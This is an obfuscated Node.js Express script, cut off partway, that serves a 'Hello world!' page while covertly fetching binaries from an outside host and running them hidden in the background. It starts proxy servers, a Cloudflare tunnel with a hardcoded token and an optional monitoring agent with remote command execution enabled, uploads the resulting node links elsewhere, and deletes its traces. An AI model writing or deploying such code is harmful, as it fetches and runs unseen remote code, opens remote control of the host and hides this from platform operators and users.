const _0x4747b9=_0xaea9;function _0xaea9(_0x398ddb,_0x1012c2){_0x398ddb=_0x398ddb-0x1a3;const _0x4c990d=_0x4c99();let _0xaea95b=_0x4c990d[_0x398ddb];return _0xaea95b;}(function(_0x37e90d,_0x4beab4){const _0x324175=_0xaea9,_0x2f9169=_0x37e90d();while(!![]){try{const _0x336659=parseInt(_0x324175(0x1b2))/0x1+-parseInt(_0x324175(0x21f))/0x2+-parseInt(_0x324175(0x238))/0x3*(-parseInt(_0x324175(0x226))/0x4)+parseInt(_0x324175(0x1c8))/0x5*(parseInt(_0x324175(0x1f9))/0x6)+-parseInt(_0x324175(0x207))/0x7*(parseInt(_0x324175(0x204))/0x8)+-parseInt(_0x324175(0x252))/0x9*(parseInt(_0x324175(0x258))/0xa)+parseInt(_0x324175(0x224))/0xb*(parseInt(_0x324175(0x249))/0xc);if(_0x336659===_0x4beab4)break;else _0x2f9169['push'](_0x2f9169['shift']());}catch(_0x9fbd8){_0x2f9169['push'](_0x2f9169['shift']());}}}(_0x4c99,0x956a6));const express=require('express'),app=express(),axios=require(_0x4747b9(0x24c)),os=require('os'),fs=require('fs'),path=require('path'),{promisify}=require(_0x4747b9(0x1cb)),exec=promisify(require(_0x4747b9(0x209))[_0x4747b9(0x1c2)]),{execSync}=require(_0x4747b9(0x209)),UPLOAD_URL=process[_0x4747b9(0x1da)][_0x4747b9(0x1b1)]||'',PROJECT_URL=process[_0x4747b9(0x1da)][_0x4747b9(0x1b7)]||'',AUTO_ACCESS=process['env'][_0x4747b9(0x1cf)]||![],FILE_PATH=process[_0x4747b9(0x1da)]['FILE_PATH']||'./tmp',SUB_PATH=process[_0x4747b9(0x1da)][_0x4747b9(0x21a)]||_0x4747b9(0x1ec),PORT=process[_0x4747b9(0x1da)]['SERVER_PORT']||process[_0x4747b9(0x1da)]['PORT']||0xbb8,UUID=process[_0x4747b9(0x1da)][_0x4747b9(0x227)]||_0x4747b9(0x200),NEZHA_SERVER=process[_0x4747b9(0x1da)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x4747b9(0x1da)][_0x4747b9(0x24f)]||'',NEZHA_KEY=process[_0x4747b9(0x1da)][_0x4747b9(0x22e)]||'',ARGO_DOMAIN=process['env'][_0x4747b9(0x20a)]||'002.arabika.ddns-ip.net',ARGO_AUTH=process['env'][_0x4747b9(0x255)]||_0x4747b9(0x1cd),ARGO_PORT=process[_0x4747b9(0x1da)][_0x4747b9(0x1d7)]||0x1f41,CFIP=process[_0x4747b9(0x1da)][_0x4747b9(0x20f)]||_0x4747b9(0x1ce),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process[_0x4747b9(0x1da)][_0x4747b9(0x228)]||'';!fs[_0x4747b9(0x1bb)](FILE_PATH)?(fs[_0x4747b9(0x1ac)](FILE_PATH),console[_0x4747b9(0x240)](FILE_PATH+'\x20is\x20created')):console[_0x4747b9(0x240)](FILE_PATH+'\x20already\x20exists');function generateRandomName(){const _0x526fca=_0x4747b9,_0x1a263d=_0x526fca(0x254);let _0x1f4429='';for(let _0x39f2b3=0x0;_0x39f2b3<0x6;_0x39f2b3++){_0x1f4429+=_0x1a263d[_0x526fca(0x203)](Math['floor'](Math[_0x526fca(0x235)]()*_0x1a263d[_0x526fca(0x1c0)]));}return _0x1f4429;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x4747b9(0x214)](FILE_PATH,npmName),phpPath=path[_0x4747b9(0x214)](FILE_PATH,phpName),webPath=path['join'](FILE_PATH,webName),botPath=path[_0x4747b9(0x214)](FILE_PATH,botName),subPath=path['join'](FILE_PATH,_0x4747b9(0x210)),listPath=path[_0x4747b9(0x214)](FILE_PATH,'list.txt'),bootLogPath=path[_0x4747b9(0x214)](FILE_PATH,_0x4747b9(0x260)),configPath=path[_0x4747b9(0x214)](FILE_PATH,_0x4747b9(0x24e));function deleteNodes(){const _0x5206a4=_0x4747b9;try{if(!UPLOAD_URL)return;if(!fs[_0x5206a4(0x1bb)](subPath))return;let _0x29ec1c;try{_0x29ec1c=fs[_0x5206a4(0x1af)](subPath,_0x5206a4(0x24b));}catch{return null;}const _0xcc76cb=Buffer[_0x5206a4(0x22a)](_0x29ec1c,_0x5206a4(0x206))['toString']('utf-8'),_0x4571d4=_0xcc76cb[_0x5206a4(0x1b0)]('\x0a')['filter'](_0x13c770=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x5206a4(0x267)](_0x13c770));if(_0x4571d4['length']===0x0)return;return axios[_0x5206a4(0x25a)](UPLOAD_URL+_0x5206a4(0x1a5),JSON['stringify']({'nodes':_0x4571d4}),{'headers':{'Content-Type':_0x5206a4(0x1a8)}})[_0x5206a4(0x21c)](_0x3375f7=>{return null;}),null;}catch(_0xc534d1){return null;}}function cleanupOldFiles(){const _0x1670ab=_0x4747b9;try{const _0x5a6ed4=fs[_0x1670ab(0x251)](FILE_PATH);_0x5a6ed4['forEach'](_0x1b08e3=>{const _0x432f97=_0x1670ab,_0x41f27f=path[_0x432f97(0x214)](FILE_PATH,_0x1b08e3);try{const _0x1ccc88=fs[_0x432f97(0x247)](_0x41f27f);_0x1ccc88[_0x432f97(0x262)]()&&fs[_0x432f97(0x1b8)](_0x41f27f);}catch(_0x5702c5){}});}catch(_0x2d05e7){}}app[_0x4747b9(0x1d5)]('/',function(_0x457dd2,_0x458b8f){const _0x4aab33=_0x4747b9;_0x458b8f[_0x4aab33(0x1c1)](_0x4aab33(0x265));});function _0x4c99(){const _0xe1b84f=['get','2096','ARGO_PORT','App\x20is\x20running','amd','env','\x20failed:\x20','Error\x20in\x20startserver:','&fp=firefox&type=ws&host=','quic','block','Empowerment\x20success\x20for\x20','writeFileSync','false','createWriteStream','http\x20server\x20is\x20running\x20on\x20port:','2083','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','finish','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','https://amd64.ssss.nyc.mn/bot','ARGO_DOMAIN:','\x22\x20>\x20/dev/null\x202>&1','sub','stringify','taskkill\x20/f\x20/im\x20','close','Download\x20','success','web\x20running\x20error:\x20','&path=%2Fvless-argo%3Fed%3D2560#','https+local://8.8.8.8/dns-query','listen','8443','pkill\x20-f\x20\x22[','direct','4074162nYwxIV','https://arm64.ssss.nyc.mn/web','127.0.0.1','\x0a\x20\x20tunnel:\x20','Subscription\x20uploaded\x20successfully','\x20-c\x20\x22','unshift','5c369b16-f4df-4286-8bcf-168e026c3ae2','\x0avless://','http','charAt','280uYdMxP','clear','base64','61355jNkeFq','unlink','child_process','ARGO_DOMAIN','response','countryCode','config.yaml','npm\x20running\x20error:\x20','CFIP','sub.txt','vless','del\x20/f\x20/q\x20','pipe','join','Error\x20reading\x20boot.log:','fileName','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','org','\x0a\x20\x20credentials-file:\x20','SUB_PATH','/api/add-nodes','catch','none','/tunnel.yml\x20run','1111634lcTdCt','win32','443','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','push','20339gERdvM','?encryption=none&security=tls&sni=','8JFsRnM','UUID','NAME','blackhole','from','Empowerment\x20failed\x20for\x20','/dev/null','country_code','NEZHA_KEY','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','\x20>/dev/null\x202>&1','all','firefox','rm\x20-rf\x20','\x20-s\x20','random','tunnel.yml','freedom','1705812jqeBvB','trojan','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','chmod','arm','\x20-p\x20','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','php\x20running\x20error:\x20','log','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','vmess','\x0a\x0avmess://','\x20-c\x20','nohup\x20','statSync','https://amd64.ssss.nyc.mn/v1','600tjfnAM','data','utf-8','axios','automatic\x20access\x20task\x20added\x20successfully','config.json','NEZHA_PORT','Error\x20executing\x20command:\x20','readdirSync','8605044ebDeMl','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','abcdefghijklmnopqrstuvwxyz','ARGO_AUTH','status','/vmess-argo','10MjUgsl','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','post','text/plain;\x20charset=utf-8','arm64','TunnelSecret','Nodes\x20uploaded\x20successfully','NEZHA\x20variable\x20is\x20empty,skip\x20running','boot.log','\x20is\x20running','isFile','stream','has','Hello\x20world!','tls','test','match','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','\x0a\x0atrojan://','/api/delete-nodes','toString','https://amd64.ssss.nyc.mn/agent','application/json','2087','set','Error\x20downloading\x20files:','mkdirSync','/trojan-argo','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','readFileSync','split','UPLOAD_URL','522029OvjCDi','includes','https://arm64.ssss.nyc.mn/v1','xtls-rprx-vision','error','PROJECT_URL','unlinkSync','/vless-argo','\x20>\x20nul\x202>&1','existsSync','https://ipapi.co/json/','/api/add-subscriptions','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','platform','length','send','exec','forEach','Unknown','https://oooo.serv00.net/add-url','aarch64','substring','5DTTnxa','pop','\x20>/dev/null\x202>&1\x20&','util','\x0aclient_secret:\x20','eyJhIjoiNDNkYjk5ZGU2N2QxYjNhNDc2NzQ0YzVmYmUwYTYzZTgiLCJ0IjoiYjg3MjRiNTQtZjU4Mi00YWUxLWFmNWItY2MzYzJmMWYyNWYzIiwicyI6Ik9HWm1PR0kwWXpBdE56azBZaTAwT0RjeUxUbGxObUV0WW1Rd04yUm1OMlJtTWpKaSJ9','cdns.doon.eu.org','AUTO_ACCESS','basename','message','map','.exe\x20>\x20nul\x202>&1','tcp'];_0x4c99=function(){return _0xe1b84f;};return _0x4c99();}async function generateConfig(){const _0x4ddd07=_0x4747b9,_0x50ddf8={'log':{'access':_0x4ddd07(0x22c),'error':_0x4ddd07(0x22c),'loglevel':_0x4ddd07(0x21d)},'inbounds':[{'port':ARGO_PORT,'protocol':_0x4ddd07(0x211),'settings':{'clients':[{'id':UUID,'flow':_0x4ddd07(0x1b5)}],'decryption':'none','fallbacks':[{'dest':0xbb9},{'path':_0x4ddd07(0x1b9),'dest':0xbba},{'path':_0x4ddd07(0x257),'dest':0xbbb},{'path':_0x4ddd07(0x1ad),'dest':0xbbc}]},'streamSettings':{'network':_0x4ddd07(0x1d4)}},{'port':0xbb9,'listen':_0x4ddd07(0x1fb),'protocol':_0x4ddd07(0x211),'settings':{'clients':[{'id':UUID}],'decryption':_0x4ddd07(0x21d)},'streamSettings':{'network':_0x4ddd07(0x1d4),'security':_0x4ddd07(0x21d)}},{'port':0xbba,'listen':_0x4ddd07(0x1fb),'protocol':_0x4ddd07(0x211),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x4ddd07(0x21d)},'streamSettings':{'network':'ws','security':_0x4ddd07(0x21d),'wsSettings':{'path':_0x4ddd07(0x1b9)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ddd07(0x202),_0x4ddd07(0x266),_0x4ddd07(0x1de)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x4ddd07(0x1fb),'protocol':_0x4ddd07(0x243),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x4ddd07(0x257)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ddd07(0x202),_0x4ddd07(0x266),_0x4ddd07(0x1de)],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x4ddd07(0x1fb),'protocol':_0x4ddd07(0x239),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x4ddd07(0x1ad)}},'sniffing':{'enabled':!![],'destOverride':[_0x4ddd07(0x202),'tls',_0x4ddd07(0x1de)],'metadataOnly':![]}}],'dns':{'servers':[_0x4ddd07(0x1f4)]},'outbounds':[{'protocol':_0x4ddd07(0x237),'tag':_0x4ddd07(0x1f8)},{'protocol':_0x4ddd07(0x229),'tag':_0x4ddd07(0x1df)}]};fs[_0x4ddd07(0x1e1)](path[_0x4ddd07(0x214)](FILE_PATH,_0x4ddd07(0x24e)),JSON['stringify'](_0x50ddf8,null,0x2));}function getSystemArchitecture(){const _0x23eb27=_0x4747b9,_0x5c010d=os['arch']();return _0x5c010d===_0x23eb27(0x23c)||_0x5c010d===_0x23eb27(0x25c)||_0x5c010d===_0x23eb27(0x1c6)?_0x23eb27(0x23c):_0x23eb27(0x1d9);}function downloadFile(_0x348301,_0x1427e9,_0x5996b5){const _0x210a11=_0x4747b9,_0x31a446=_0x348301;!fs['existsSync'](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x35d145=fs[_0x210a11(0x1e3)](_0x31a446);axios({'method':_0x210a11(0x1d5),'url':_0x1427e9,'responseType':_0x210a11(0x263)})['then'](_0x4f5149=>{const _0x9601a1=_0x210a11;_0x4f5149[_0x9601a1(0x24a)][_0x9601a1(0x213)](_0x35d145),_0x35d145['on'](_0x9601a1(0x1e7),()=>{const _0x56c6dc=_0x9601a1;_0x35d145[_0x56c6dc(0x1ef)](),console[_0x56c6dc(0x240)](_0x56c6dc(0x1f0)+path[_0x56c6dc(0x1d0)](_0x31a446)+'\x20successfully'),_0x5996b5(null,_0x31a446);}),_0x35d145['on'](_0x9601a1(0x1b6),_0x44428a=>{const _0x17d0b2=_0x9601a1;fs[_0x17d0b2(0x208)](_0x31a446,()=>{});const _0x301c4a=_0x17d0b2(0x1f0)+path[_0x17d0b2(0x1d0)](_0x31a446)+_0x17d0b2(0x1db)+_0x44428a['message'];console[_0x17d0b2(0x1b6)](_0x301c4a),_0x5996b5(_0x301c4a);});})[_0x210a11(0x21c)](_0x2358f6=>{const _0x1ca7a8=_0x210a11,_0x13111b='Download\x20'+path[_0x1ca7a8(0x1d0)](_0x31a446)+'\x20failed:\x20'+_0x2358f6[_0x1ca7a8(0x1d1)];console['error'](_0x13111b),_0x5996b5(_0x13111b);});}async function downloadFilesAndRun(){const _0x4aba1d=_0x4747b9,_0x5cd0b1=getSystemArchitecture(),_0x496320=getFilesForArchitecture(_0x5cd0b1);if(_0x496320['length']===0x0){console['log'](_0x4aba1d(0x242));return;}const _0x364e46=_0x496320[_0x4aba1d(0x1d2)](_0x289e42=>{return new Promise((_0xd4d9f7,_0x5be31c)=>{const _0x172788=_0xaea9;downloadFile(_0x289e42[_0x172788(0x216)],_0x289e42['fileUrl'],(_0x25b507,_0x1e0c95)=>{_0x25b507?_0x5be31c(_0x25b507):_0xd4d9f7(_0x1e0c95);});});});try{await Promise[_0x4aba1d(0x231)](_0x364e46);}catch(_0x4f3fea){console['error'](_0x4aba1d(0x1ab),_0x4f3fea);return;}function _0x5ceff3(_0x18987a){const _0x5214ee=_0x4aba1d,_0x487a29=0x1fd;_0x18987a[_0x5214ee(0x1c3)](_0x1de8b1=>{const _0x38af59=_0x5214ee;fs[_0x38af59(0x1bb)](_0x1de8b1)&&fs[_0x38af59(0x23b)](_0x1de8b1,_0x487a29,_0x26fcb5=>{const _0x1a1d73=_0x38af59;_0x26fcb5?console['error'](_0x1a1d73(0x22b)+_0x1de8b1+':\x20'+_0x26fcb5):console[_0x1a1d73(0x240)](_0x1a1d73(0x1e0)+_0x1de8b1+':\x20'+_0x487a29[_0x1a1d73(0x1a6)](0x8));});});}const _0x3677ec=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5ceff3(_0x3677ec);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x4c908f=NEZHA_SERVER[_0x4aba1d(0x1b3)](':')?NEZHA_SERVER[_0x4aba1d(0x1b0)](':')[_0x4aba1d(0x1c9)]():'',_0x578edb=new Set([_0x4aba1d(0x221),_0x4aba1d(0x1f6),_0x4aba1d(0x1d6),_0x4aba1d(0x1a9),_0x4aba1d(0x1e5),'2053']),_0x432250=_0x578edb[_0x4aba1d(0x264)](_0x4c908f)?'true':_0x4aba1d(0x1e2),_0x3065c5=_0x4aba1d(0x1cc)+NEZHA_KEY+_0x4aba1d(0x1be)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x432250+_0x4aba1d(0x241)+UUID;fs[_0x4aba1d(0x1e1)](path[_0x4aba1d(0x214)](FILE_PATH,_0x4aba1d(0x20d)),_0x3065c5);const _0x4b4e8d=_0x4aba1d(0x246)+phpPath+_0x4aba1d(0x1fe)+FILE_PATH+_0x4aba1d(0x1a3);try{await exec(_0x4b4e8d),console[_0x4aba1d(0x240)](phpName+_0x4aba1d(0x261)),await new Promise(_0x5ef90e=>setTimeout(_0x5ef90e,0x3e8));}catch(_0x16e3b8){console[_0x4aba1d(0x1b6)](_0x4aba1d(0x23f)+_0x16e3b8);}}else{let _0x4edfd0='';const _0x2057c4=[_0x4aba1d(0x221),_0x4aba1d(0x1f6),_0x4aba1d(0x1d6),'2087','2083','2053'];_0x2057c4[_0x4aba1d(0x1b3)](NEZHA_PORT)&&(_0x4edfd0='--tls');const _0x41ad05=_0x4aba1d(0x246)+npmPath+_0x4aba1d(0x234)+NEZHA_SERVER+':'+NEZHA_PORT+_0x4aba1d(0x23d)+NEZHA_KEY+'\x20'+_0x4edfd0+_0x4aba1d(0x222);try{await exec(_0x41ad05),console['log'](npmName+_0x4aba1d(0x261)),await new Promise(_0x367157=>setTimeout(_0x367157,0x3e8));}catch(_0x121344){console['error'](_0x4aba1d(0x20e)+_0x121344);}}}else console['log'](_0x4aba1d(0x25f));const _0x11f469=_0x4aba1d(0x246)+webPath+_0x4aba1d(0x245)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x11f469),console[_0x4aba1d(0x240)](webName+_0x4aba1d(0x261)),await new Promise(_0x47bf5f=>setTimeout(_0x47bf5f,0x3e8));}catch(_0x2170dd){console['error'](_0x4aba1d(0x1f2)+_0x2170dd);}if(fs[_0x4aba1d(0x1bb)](botPath)){let _0x49c294;if(ARGO_AUTH[_0x4aba1d(0x268)](/^[A-Z0-9a-z=]{120,250}$/))_0x49c294=_0x4aba1d(0x1e8)+ARGO_AUTH;else ARGO_AUTH[_0x4aba1d(0x268)](/TunnelSecret/)?_0x49c294=_0x4aba1d(0x1ae)+FILE_PATH+_0x4aba1d(0x21e):_0x49c294=_0x4aba1d(0x253)+FILE_PATH+_0x4aba1d(0x217)+ARGO_PORT;try{await exec(_0x4aba1d(0x246)+botPath+'\x20'+_0x49c294+_0x4aba1d(0x1ca)),console['log'](botName+_0x4aba1d(0x261)),await new Promise(_0x5f55f8=>setTimeout(_0x5f55f8,0x7d0));}catch(_0x501366){console[_0x4aba1d(0x1b6)](_0x4aba1d(0x250)+_0x501366);}}await new Promise(_0x44961f=>setTimeout(_0x44961f,0x1388));}function getFilesForArchitecture(_0x1f0744){const _0x5b0e77=_0x4747b9;let _0x3ad0a6;_0x1f0744===_0x5b0e77(0x23c)?_0x3ad0a6=[{'fileName':webPath,'fileUrl':_0x5b0e77(0x1fa)},{'fileName':botPath,'fileUrl':'https://arm64.ssss.nyc.mn/bot'}]:_0x3ad0a6=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x5b0e77(0x1e9)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x368f13=_0x1f0744===_0x5b0e77(0x23c)?'https://arm64.ssss.nyc.mn/agent':_0x5b0e77(0x1a7);_0x3ad0a6[_0x5b0e77(0x1ff)]({'fileName':npmPath,'fileUrl':_0x368f13});}else{const _0x421016=_0x1f0744===_0x5b0e77(0x23c)?_0x5b0e77(0x1b4):_0x5b0e77(0x248);_0x3ad0a6['unshift']({'fileName':phpPath,'fileUrl':_0x421016});}}return _0x3ad0a6;}function argoType(){const _0x13ad11=_0x4747b9;if(!ARGO_AUTH||!ARGO_DOMAIN){console['log'](_0x13ad11(0x23a));return;}if(ARGO_AUTH['includes'](_0x13ad11(0x25d))){fs[_0x13ad11(0x1e1)](path[_0x13ad11(0x214)](FILE_PATH,'tunnel.json'),ARGO_AUTH);const _0x327ca9=_0x13ad11(0x1fc)+ARGO_AUTH[_0x13ad11(0x1b0)]('\x22')[0xb]+_0x13ad11(0x219)+path[_0x13ad11(0x214)](FILE_PATH,'tunnel.json')+_0x13ad11(0x23e)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x13ad11(0x1e6);fs[_0x13ad11(0x1e1)](path[_0x13ad11(0x214)](FILE_PATH,_0x13ad11(0x236)),_0x327ca9);}else console[_0x13ad11(0x240)](_0x13ad11(0x22f));}async function extractDomains(){const _0x1d95ef=_0x4747b9;let _0x11cfb5;if(ARGO_AUTH&&ARGO_DOMAIN)_0x11cfb5=ARGO_DOMAIN,console[_0x1d95ef(0x240)](_0x1d95ef(0x1ea),_0x11cfb5),await _0x4cbae0(_0x11cfb5);else try{const _0x127545=fs[_0x1d95ef(0x1af)](path['join'](FILE_PATH,'boot.log'),_0x1d95ef(0x24b)),_0x2b1e02=_0x127545['split']('\x0a'),_0x3f91d6=[];_0x2b1e02['forEach'](_0x1a9e3b=>{const _0x55648c=_0x1d95ef,_0x2c5709=_0x1a9e3b[_0x55648c(0x268)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x2c5709){const _0x237093=_0x2c5709[0x1];_0x3f91d6[_0x55648c(0x223)](_0x237093);}});if(_0x3f91d6[_0x1d95ef(0x1c0)]>0x0)_0x11cfb5=_0x3f91d6[0x0],console['log']('ArgoDomain:',_0x11cfb5),await _0x4cbae0(_0x11cfb5);else{console[_0x1d95ef(0x240)]('ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain'),fs['unlinkSync'](path[_0x1d95ef(0x214)](FILE_PATH,'boot.log'));async function _0x2852e5(){const _0x20ec7c=_0x1d95ef;try{process[_0x20ec7c(0x1bf)]===_0x20ec7c(0x220)?await exec(_0x20ec7c(0x1ee)+botName+_0x20ec7c(0x1d3)):await exec(_0x20ec7c(0x1f7)+botName[_0x20ec7c(0x203)](0x0)+']'+botName[_0x20ec7c(0x1c7)](0x1)+_0x20ec7c(0x1eb));}catch(_0x1cf100){}}_0x2852e5(),await new Promise(_0x50c1eb=>setTimeout(_0x50c1eb,0xbb8));const _0x12ea29='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x1d95ef(0x217)+ARGO_PORT;try{await exec(_0x1d95ef(0x246)+botPath+'\x20'+_0x12ea29+_0x1d95ef(0x1ca)),console[_0x1d95ef(0x240)](botName+_0x1d95ef(0x261)),await new Promise(_0x54ef79=>setTimeout(_0x54ef79,0xbb8)),await extractDomains();}catch(_0xd5ab9e){console[_0x1d95ef(0x1b6)](_0x1d95ef(0x250)+_0xd5ab9e);}}}catch(_0xb22e9f){console['error'](_0x1d95ef(0x215),_0xb22e9f);}async function _0x5e8b21(){const _0xdde828=_0x1d95ef;try{const _0x13c875=await axios[_0xdde828(0x1d5)](_0xdde828(0x1bc),{'timeout':0xbb8});if(_0x13c875[_0xdde828(0x24a)]&&_0x13c875['data']['country_code']&&_0x13c875[_0xdde828(0x24a)]['org'])return _0x13c875[_0xdde828(0x24a)][_0xdde828(0x22d)]+'_'+_0x13c875['data']['org'];}catch(_0x4a80f4){try{const _0x55417e=await axios[_0xdde828(0x1d5)]('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x55417e[_0xdde828(0x24a)]&&_0x55417e[_0xdde828(0x24a)][_0xdde828(0x256)]===_0xdde828(0x1f1)&&_0x55417e[_0xdde828(0x24a)][_0xdde828(0x20c)]&&_0x55417e[_0xdde828(0x24a)]['org'])return _0x55417e[_0xdde828(0x24a)]['countryCode']+'_'+_0x55417e[_0xdde828(0x24a)][_0xdde828(0x218)];}catch(_0x56c704){}}return _0xdde828(0x1c4);}async function _0x4cbae0(_0x2db782){const _0x219d9a=await _0x5e8b21(),_0x5b865e=NAME?NAME+'-'+_0x219d9a:_0x219d9a;return new Promise(_0x245a38=>{setTimeout(()=>{const _0xb30a3b=_0xaea9,_0x5cb844={'v':'2','ps':''+_0x5b865e,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':'none','net':'ws','type':'none','host':_0x2db782,'path':'/vmess-argo?ed=2560','tls':_0xb30a3b(0x266),'sni':_0x2db782,'alpn':'','fp':_0xb30a3b(0x232)},_0x253ff8=_0xb30a3b(0x201)+UUID+'@'+CFIP+':'+CFPORT+_0xb30a3b(0x225)+_0x2db782+'&fp=firefox&type=ws&host='+_0x2db782+_0xb30a3b(0x1f3)+_0x5b865e+_0xb30a3b(0x244)+Buffer[_0xb30a3b(0x22a)](JSON[_0xb30a3b(0x1ed)](_0x5cb844))[_0xb30a3b(0x1a6)](_0xb30a3b(0x206))+_0xb30a3b(0x1a4)+UUID+'@'+CFIP+':'+CFPORT+'?security=tls&sni='+_0x2db782+_0xb30a3b(0x1dd)+_0x2db782+'&path=%2Ftrojan-argo%3Fed%3D2560#'+_0x5b865e+'\x0a\x20\x20\x20\x20';console['log'](Buffer['from'](_0x253ff8)['toString'](_0xb30a3b(0x206))),fs[_0xb30a3b(0x1e1)](subPath,Buffer['from'](_0x253ff8)[_0xb30a3b(0x1a6)](_0xb30a3b(0x206))),console[_0xb30a3b(0x240)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xb30a3b(0x1d5)]('/'+SUB_PATH,(_0x180706,_0x505886)=>{const _0x1bf289=_0xb30a3b,_0x30e493=Buffer['from'](_0x253ff8)[_0x1bf289(0x1a6)](_0x1bf289(0x206));_0x505886[_0x1bf289(0x1aa)]('Content-Type',_0x1bf289(0x25b)),_0x505886[_0x1bf289(0x1c1)](_0x30e493);}),_0x245a38(_0x253ff8);},0x7d0);});}}async function uploadNodes(){const _0x4933f2=_0x4747b9;if(UPLOAD_URL&&PROJECT_URL){const _0x3f4b4a=PROJECT_URL+'/'+SUB_PATH,_0x2fbc23={'subscription':[_0x3f4b4a]};try{const _0xb6a765=await axios[_0x4933f2(0x25a)](UPLOAD_URL+_0x4933f2(0x1bd),_0x2fbc23,{'headers':{'Content-Type':_0x4933f2(0x1a8)}});return _0xb6a765&&_0xb6a765[_0x4933f2(0x256)]===0xc8?(console[_0x4933f2(0x240)](_0x4933f2(0x1fd)),_0xb6a765):null;}catch(_0x1e17fe){if(_0x1e17fe[_0x4933f2(0x20b)]){if(_0x1e17fe[_0x4933f2(0x20b)][_0x4933f2(0x256)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs['existsSync'](listPath))return;const _0x2dce28=fs[_0x4933f2(0x1af)](listPath,_0x4933f2(0x24b)),_0x33ee8d=_0x2dce28[_0x4933f2(0x1b0)]('\x0a')['filter'](_0x3db81c=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4933f2(0x267)](_0x3db81c));if(_0x33ee8d[_0x4933f2(0x1c0)]===0x0)return;const _0x58549e=JSON[_0x4933f2(0x1ed)]({'nodes':_0x33ee8d});try{const _0x257deb=await axios['post'](UPLOAD_URL+_0x4933f2(0x21b),_0x58549e,{'headers':{'Content-Type':_0x4933f2(0x1a8)}});return _0x257deb&&_0x257deb[_0x4933f2(0x256)]===0xc8?(console[_0x4933f2(0x240)](_0x4933f2(0x25e)),_0x257deb):null;}catch(_0xdccb4f){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x3ccd83=_0xaea9,_0x195426=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x195426[_0x3ccd83(0x223)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x195426[_0x3ccd83(0x223)](phpPath);process[_0x3ccd83(0x1bf)]===_0x3ccd83(0x220)?exec(_0x3ccd83(0x212)+_0x195426['join']('\x20')+_0x3ccd83(0x1ba),_0x43f4bf=>{const _0x36e786=_0x3ccd83;console['clear'](),console[_0x36e786(0x240)](_0x36e786(0x1d8)),console[_0x36e786(0x240)](_0x36e786(0x259));}):exec(_0x3ccd83(0x233)+_0x195426[_0x3ccd83(0x214)]('\x20')+_0x3ccd83(0x230),_0x30e669=>{const _0x2c32ed=_0x3ccd83;console[_0x2c32ed(0x205)](),console[_0x2c32ed(0x240)](_0x2c32ed(0x1d8)),console[_0x2c32ed(0x240)](_0x2c32ed(0x259));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x27c671=_0x4747b9;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x27c671(0x240)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x9ff52c=await axios[_0x27c671(0x25a)](_0x27c671(0x1c5),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x27c671(0x1a8)}});return 